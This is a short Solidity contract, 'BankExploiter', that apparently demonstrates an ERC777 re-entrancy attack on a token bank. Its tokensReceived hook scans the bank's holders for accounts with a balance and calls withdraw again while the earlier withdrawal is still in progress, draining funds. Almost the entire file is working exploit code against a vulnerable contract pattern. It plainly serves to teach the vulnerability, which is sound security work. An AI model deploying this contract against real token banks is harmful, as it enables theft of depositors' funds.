// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {IERC777} from "@openzeppelin/contracts@4.9.0/token/ERC777/IERC777.sol";
import {IERC777Recipient} from "@openzeppelin/contracts@4.9.0/token/ERC777/IERC777Recipient.sol";

interface IERC777Bank {
    function accountBalances(address victim) external returns (uint256);
    function holders(uint256) external returns (address);
    function numClients() external returns (uint256);
    function withdraw(address recipient, uint256 amount) external;
}

/// @title An exploitative ERC777 Bank Saver that demonstrates ERC777 re-entrancy vulnerability
/// @author Yves
/// @notice Savings Token is an ERC777 contract
contract BankExploiter is IERC777Recipient {
    IERC777 public savingsToken;
    IERC777Bank public bank;
    uint256 iterator = 0;

    constructor(address savingsToken_, address bank_) {
        savingsToken = IERC777(savingsToken_);
        bank = IERC777Bank(bank_);
    }

    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {
        operator;
        from;
        to;
        userData;
        operatorData;
        uint256 iterations = bank.numClients();
        for (uint256 index = 0; index < iterations; index++) {
            address potentialNextVictim = bank.holders(index);
            uint256 bounty = bank.accountBalances(potentialNextVictim);
            if (bounty > 0) {
                bank.withdraw(address(this), amount);
                break;
            }
        }
    }
}
